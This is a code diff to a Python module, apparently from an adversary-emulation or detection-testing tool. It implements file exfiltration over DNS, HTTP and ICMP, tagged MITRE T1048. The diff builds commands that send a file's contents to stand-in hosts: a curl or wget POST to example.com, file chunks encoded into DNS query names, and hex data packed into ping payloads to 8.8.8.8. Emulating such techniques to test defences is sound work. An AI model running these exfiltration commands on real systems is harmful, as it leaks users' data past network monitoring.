@@ -1,4 +1,27 @@
+from urllib.parse import urlparse
 from .SendFileBase import SendFileBase
+
+
+def _extract_domain_from_url(url: str) -> str:
+    """
+    Safely extract the domain/hostname from a URL.
+    
+    Args:
+        url: The URL to parse
+        
+    Returns:
+        The domain/hostname, or empty string if parsing fails
+    """
+    try:
+        parsed = urlparse(url)
+        if parsed.netloc:
+            # netloc includes port, so split on ':' to get just the hostname
+            return parsed.netloc.split(':')[0]
+        return ""
+    except (ValueError, AttributeError):
+        # Handle malformed URLs gracefully
+        return ""
+
 
 class SendFileUDP(SendFileBase):
     """
@@ -9,7 +32,7 @@ class SendFileUDP(SendFileBase):
     """
 
     def __init__(self):
-        super().__init__("SendFileUDP", "udp")
+        super().__init__("SendFileUDP", "udp", technique="T1048")
 
 
     def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
@@ -20,6 +43,22 @@ class SendFileUDP(SendFileBase):
         encoded_data, encode_status = self._encode_file(live_session, file_path)
         if encode_status != 0:
             return "Failed to read and encode file", 1, ""
+        
+        # Filter out any invalid characters (shell prompts, whitespace, etc.) from base64 output
+        # Base64 uses: A-Z, a-z, 0-9, +, /, and = (for padding)
+        valid_base64_chars = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
+        filtered_data = ''.join(c for c in encoded_data if c in valid_base64_chars)
+        
+        # Check if filtering removed significant data (more than just whitespace/prompts)
+        if len(filtered_data) < len(encoded_data) * 0.9:  # If we lost more than 10% of data
+            invalid_chars = set(c for c in encoded_data if c not in valid_base64_chars)
+            # Only report if there are significant invalid characters (not just whitespace)
+            significant_invalid = [c for c in invalid_chars if c not in ' \n\r\t']
+            if significant_invalid:
+                return f"ERROR: Base64 encoded data contains invalid characters: {''.join(sorted(significant_invalid))}. This may indicate encoding issues.", 1, ""
+        
+        # Use filtered data (removes shell artifacts while preserving valid base64)
+        encoded_data = filtered_data
         
         # Split into chunks (DNS labels max 63 chars, use 50 for safety)
         chunk_size = 50
@@ -65,7 +104,14 @@ class SendFileUDP(SendFileBase):
         
         for i, chunk in enumerate(chunks):
             # Clean chunk for DNS (remove invalid chars)
+            # Since we validated the data above, this should not remove any characters,
+            # but we keep it as a safety measure for DNS label restrictions
             clean_chunk = ''.join(c for c in chunk if c.isalnum() or c in ['+', '/', '='])
+            
+            # Track if cleaning removed any characters (shouldn't happen after validation)
+            if len(clean_chunk) != len(chunk):
+                removed_chars = len(chunk) - len(clean_chunk)
+                return f"ERROR: Chunk cleaning removed {removed_chars} character(s) from chunk {i}. This indicates invalid base64 data despite validation.", 1, target_domain
             
             dns_cmd = tool_cmd_template.format(query=f"{clean_chunk}.{i}.{target_domain}")
             result = live_session.run_command(dns_cmd)
@@ -100,7 +146,7 @@ class SendFileHTTP(SendFileBase):
         """
         Send file via HTTP POST using curl, with wget as fallback.
         """
-        escaped_path = file_path.replace('"', '\\"')
+        escaped_path = self._escape_path_for_shell(file_path)
         target_url = "http://example.com/upload"
         
         # Check if curl is available
@@ -109,17 +155,39 @@ class SendFileHTTP(SendFileBase):
         
         if use_curl:
             # Try curl first
-            cmd = f"curl -X POST -F 'file=@{escaped_path}' {target_url} 2>&1"
+            # Capture both output and exit code to determine if command executed successfully
+            cmd = f"curl -X POST -F 'file=@{escaped_path}' {target_url} 2>&1; echo 'CURL_EXIT_CODE:$?'"
             output = live_session.run_command(cmd)
             
-            # Check for curl errors
+            # Check for curl errors (command not found)
             if "not found" in output.lower() or "command not found" in output.lower():
                 use_curl = False  # Fall back to wget
             else:
-                exit_status = 0 if any(x in output for x in ["200", "201", "success", "OK"]) else 1
+                # Parse exit code from output
+                # We use exit codes rather than string matching (e.g., checking for "200", "201", "OK")
+                # to avoid false positives from error messages that might contain those words
+                exit_code = 1  # Default to failure
+                for line in output.split("\n"):
+                    if line.strip().startswith("CURL_EXIT_CODE:"):
+                        try:
+                            exit_code = int(line.split(":")[1].strip())
+                            break
+                        except (ValueError, IndexError):
+                            pass
+                
+                # Remove the exit code line from output for cleaner output
+                clean_output = "\n".join(
+                    line for line in output.split("\n") 
+                    if not line.strip().startswith("CURL_EXIT_CODE:")
+                )
+                
+                # exit_status reflects whether curl executed successfully (exit code 0)
+                # not whether the HTTP response was successful
+                # Using exit code prevents false positives from string matching output
+                exit_status = 0 if exit_code == 0 else 1
                 # Extract domain from URL (example.com from http://example.com/upload)
-                target_domain = target_url.split("://")[1].split("/")[0]
-                return output, exit_status, target_domain
+                target_domain = _extract_domain_from_url(target_url)
+                return clean_output, exit_status, target_domain
         
         # Fallback to wget if curl failed or not available
         if not use_curl:
@@ -129,17 +197,39 @@ class SendFileHTTP(SendFileBase):
             
             # wget doesn't support multipart/form-data POST like curl, so we'll use --post-file
             # For a more realistic approach, we could base64 encode and send as data
-            cmd = f"wget --post-file='{escaped_path}' {target_url} -O /dev/null 2>&1"
+            # Capture both output and exit code to determine if command executed successfully
+            cmd = f"wget --post-file='{escaped_path}' {target_url} -O /dev/null 2>&1; echo 'WGET_EXIT_CODE:$?'"
             output = live_session.run_command(cmd)
             
-            # Check for wget errors
+            # Check for wget errors (command not found)
             if "not found" in output.lower() or "command not found" in output.lower():
                 return f"ERROR: wget command failed: {output}", 1, ""
             
-            exit_status = 0 if any(x in output for x in ["200", "201", "success", "OK", "saved"]) else 1
+            # Parse exit code from output
+            # We use exit codes rather than string matching (e.g., checking for "saved", "200 OK")
+            # to avoid false positives from error messages that might contain those words
+            exit_code = 1  # Default to failure
+            for line in output.split("\n"):
+                if line.strip().startswith("WGET_EXIT_CODE:"):
+                    try:
+                        exit_code = int(line.split(":")[1].strip())
+                        break
+                    except (ValueError, IndexError):
+                        pass
+            
+            # Remove the exit code line from output for cleaner output
+            clean_output = "\n".join(
+                line for line in output.split("\n") 
+                if not line.strip().startswith("WGET_EXIT_CODE:")
+            )
+            
+            # exit_status reflects whether wget executed successfully (exit code 0)
+            # not whether the HTTP response was successful
+            # Using exit code prevents false positives from string matching output
+            exit_status = 0 if exit_code == 0 else 1
             # Extract domain from URL (example.com from http://example.com/upload)
-            target_domain = target_url.split("://")[1].split("/")[0]
-            return output, exit_status, target_domain
+            target_domain = _extract_domain_from_url(target_url)
+            return clean_output, exit_status, target_domain
         
         return "ERROR: Failed to send file", 1, ""
 
@@ -153,7 +243,7 @@ class SendFileICMP(SendFileBase):
     """
 
     def __init__(self):
-        super().__init__("SendFileICMP", "icmp")
+        super().__init__("SendFileICMP", "icmp", technique="T1048")
 
     def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
         """
@@ -163,13 +253,15 @@ class SendFileICMP(SendFileBase):
         if encode_status != 0:
             return "Failed to read and encode file", 1, ""
         
-        chunk_size = 32
+        # ICMP ping payload is limited to 8 bytes of hex data (16 hex characters)
+        # Each chunk is 8 characters of base64, which becomes 8 bytes when encoded to hex
+        chunk_size = 8
         chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
         target_ip = "8.8.8.8"
         
         results = []
         for i, chunk in enumerate(chunks[:10]):  # Limit to 10 for testing
-            hex_data = chunk[:8].encode().hex()
+            hex_data = chunk.encode().hex()
             ping_cmd = f"ping -c 1 -p {hex_data} {target_ip} 2>&1"
             result = live_session.run_command(ping_cmd)
             results.append(result)
